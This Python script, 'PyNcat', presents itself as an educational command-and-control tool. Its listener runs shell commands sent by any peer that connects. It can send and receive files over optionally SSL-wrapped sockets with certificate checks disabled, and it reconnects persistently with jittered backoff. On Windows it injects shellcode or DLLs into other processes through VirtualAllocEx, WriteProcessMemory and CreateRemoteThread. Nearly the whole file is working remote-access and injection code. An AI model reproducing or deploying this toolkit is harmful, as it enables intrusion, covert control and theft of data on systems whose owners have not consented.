#!/usr/bin/env python3
"""
PyNcat - Professional C2 Tool with SSL, Persistence & Process Injection
Educational Red/Blue Team Training Tool
"""

import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import time
import random
import ssl
import os
from typing import Optional, Tuple

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)


class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        self.ssl_context: Optional[ssl.SSLContext] = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(
            description="PyNcat - Professional C2 with Process Injection",
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode (C2)')
        group.add_argument('-c', '--connect', type=str, help='Target IP for reverse shell')

        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        
        # Core Features
        parser.add_argument('-e', '--execute', type=str, help='Execute command on connection')
        parser.add_argument('-f', '--file', type=str, help='File to upload (client) / save (listener)')
        
        # SSL
        parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS')
        parser.add_argument('--cert', type=str, help='SSL certificate path')
        parser.add_argument('--key', type=str, help='SSL private key path')
        
        # Persistence
        parser.add_argument('--persistent', action='store_true', help='Persistent reverse shell')
        parser.add_argument('--max-retries', type=int, default=0, help='Max retries (0 = infinite)')
        parser.add_argument('--delay', type=int, default=5, help='Base delay between retries')

        # Process Injection (Windows only)
        parser.add_argument('--inject-pid', type=int, help='Target PID for injection')
        parser.add_argument('--inject-shellcode', type=str, help='Path to raw shellcode file')
        parser.add_argument('--inject-dll', type=str, help='Path to DLL for injection')

        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

        return parser.parse_args()

    # ====================== SSL ======================
    def setup_ssl(self):
        cert_path = self.args.cert
        key_path = self.args.key

        if not cert_path or not key_path:
            logger.info("[*] Generating self-signed certificate...")
            cert_path, key_path = self.generate_self_signed_cert()

        try:
            if self.args.listen:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            else:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            self.ssl_context = context
            logger.info("[+] SSL context initialized")
        except Exception as e:
            logger.error(f"SSL setup failed: {e}")
            sys.exit(1)

    def generate_self_signed_cert(self) -> Tuple[str, str]:
        try:
            from OpenSSL import crypto
        except ImportError:
            logger.error("[!] pyOpenSSL required: pip install pyOpenSSL")
            sys.exit(1)

        cert_path = "/tmp/pyncat_cert.pem"
        key_path = "/tmp/pyncat_key.pem"

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.get_subject().CN = "pyncat"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        logger.info(f"[+] Self-signed cert generated: {cert_path}")
        return cert_path, key_path

    # ====================== PROCESS INJECTION ======================
    def inject_shellcode(self, pid: int, shellcode_path: Optional[str] = None) -> bool:
        if os.name != 'nt':
            logger.error("[!] Shellcode injection supported only on Windows")
            return False

        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32

            if shellcode_path and Path(shellcode_path).exists():
                with open(shellcode_path, 'rb') as f:
                    shellcode = f.read()
            else:
                logger.warning("[*] Using built-in demo MessageBox shellcode")
                shellcode = bytes([0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00])  # truncated demo

            logger.info(f"[*] Injecting {len(shellcode)} bytes into PID {pid}")

            PROCESS_ALL_ACCESS = 0x1F0FFF
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40

            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                logger.error(f"[!] Failed to open PID {pid}")
                return False

            addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode),
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                logger.error("[!] VirtualAllocEx failed")
                return False

            written = ctypes.c_size_t(0)
            kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))

            thread_id = ctypes.c_ulong(0)
            if kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)):
                logger.info(f"[+] Shellcode injected successfully! Thread ID: {thread_id.value}")
                return True
            return False

        except Exception as e:
            logger.error(f"Shellcode injection failed: {e}")
            return False

    def inject_dll(self, pid: int, dll_path: str) -> bool:
        if os.name != 'nt':
            logger.error("[!] DLL injection supported only on Windows")
            return False

        if not Path(dll_path).exists():
            logger.error(f"[!] DLL not found: {dll_path}")
            return False

        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32

            dll_path = str(Path(dll_path).absolute())
            dll_len = len(dll_path) + 1

            h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
            if not h_process:
                logger.error(f"[!] Cannot open PID {pid}")
                return False

            addr = kernel32.VirtualAllocEx(h_process, None, dll_len, 0x3000, 0x40)
            written = ctypes.c_size_t(0)
            kernel32.WriteProcessMemory(h_process, addr, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))

            loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")

            if kernel32.CreateRemoteThread(h_process, None, 0, loadlib, addr, 0, None):
                logger.info(f"[+] DLL injected into PID {pid}")
                return True
            return False

        except Exception as e:
            logger.error(f"DLL injection failed: {e}")
            return False

    # ====================== COMMAND EXECUTION ======================
    def execute_command(self, cmd: str) -> str:
        try:
            result = subprocess.run(cmd.split(), capture_output=True, timeout=15, text=True)
            return result.stdout + result.stderr or "[+] Command executed.\n"
        except Exception as e:
            return f"[!] Error: {e}\n"

    # ====================== LISTENER ======================
    def handle_client(self, client_socket: socket.socket, addr: tuple):
        logger.info(f"[+] Connection from {addr}")
        try:
            if self.args.execute:
                client_socket.sendall(self.execute_command(self.args.execute).encode())

            if self.args.file and self.args.listen:
                self.save_file(client_socket, self.args.file)

            while True:
                client_socket.sendall(b"pyncat> ")
                data = client_socket.recv(8192)
                if not data:
                    break
                request = data.decode('utf-8').strip()
                if request.lower() in ['exit', 'quit']:
                    client_socket.sendall(b"[*] Goodbye!\n")
                    break
                output = self.execute_command(request)
                client_socket.sendall(output.encode())
        except Exception as e:
            logger.debug(f"Handler error: {e}")
        finally:
            client_socket.close()

    def save_file(self, client_socket: socket.socket, filepath: str):
        try:
            with open(filepath, 'wb') as f:
                while chunk := client_socket.recv(8192):
                    f.write(chunk)
            logger.info(f"[+] File saved: {filepath}")
        except Exception as e:
            logger.error(f"File save failed: {e}")

    def listen(self):
        server: Optional[socket.socket] = None
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.args.port))

            if self.args.ssl and self.ssl_context:
                server = self.ssl_context.wrap_socket(server, server_side=True)

            server.listen(5)
            logger.info(f"[*] Listening on 0.0.0.0:{self.args.port} {'(SSL)' if self.args.ssl else ''}")

            while True:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
        except KeyboardInterrupt:
            logger.info("\n[!] Listener shutting down...")
        except Exception as e:
            logger.error(f"Listener error: {e}")
        finally:
            if server:
                server.close()

    # ====================== CLIENT ======================
    def connect_once(self) -> bool:
        client: Optional[socket.socket] = None
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            if self.args.ssl and self.ssl_context:
                client = self.ssl_context.wrap_socket(client)

            logger.info(f"[*] Connecting to {self.args.connect}:{self.args.port}...")
            client.connect((self.args.connect, self.args.port))
            logger.info("[+] Connected!")

            if self.args.file:
                self.send_file(client, self.args.file)
                return True

            while True:
                response = client.recv(8192).decode('utf-8', errors='replace')
                if response:
                    print(response, end='', flush=True)

                cmd = input()
                if cmd.lower() in ['exit', 'quit']:
                    client.sendall(b'exit\n')
                    break
                client.sendall((cmd + '\n').encode())
        except Exception as e:
            logger.info(f"[!] Connection error: {e}")
            return False
        finally:
            if client:
                client.close()
        return True

    def send_file(self, client_socket: socket.socket, filepath: str):
        path = Path(filepath)
        if not path.exists():
            logger.error(f"File not found: {filepath}")
            return
        try:
            with open(path, 'rb') as f:
                while chunk := f.read(8192):
                    client_socket.sendall(chunk)
            logger.info(f"[+] Sent file: {filepath}")
        except Exception as e:
            logger.error(f"File send failed: {e}")

    def connect_persistent(self):
        retries = 0
        while True:
            try:
                if self.connect_once() and not self.args.file:
                    break
            except KeyboardInterrupt:
                break

            retries += 1
            if self.args.max_retries > 0 and retries > self.args.max_retries:
                break

            delay = min(self.args.delay * (2 ** (retries % 6)), 300)
            sleep_time = delay * random.uniform(0.5, 1.5)
            logger.info(f"[*] Reconnecting in {sleep_time:.1f}s...")
            time.sleep(sleep_time)

    # ====================== RUN ======================
    def run(self):
        # Process Injection Mode
        if self.args.inject_pid:
            if self.args.inject_shellcode:
                self.inject_shellcode(self.args.inject_pid, self.args.inject_shellcode)
            elif self.args.inject_dll:
                self.inject_dll(self.args.inject_pid, self.args.inject_dll)
            else:
                logger.error("[!] Specify --inject-shellcode or --inject-dll")
            return

        # Normal C2 Mode
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()


if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated by user.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
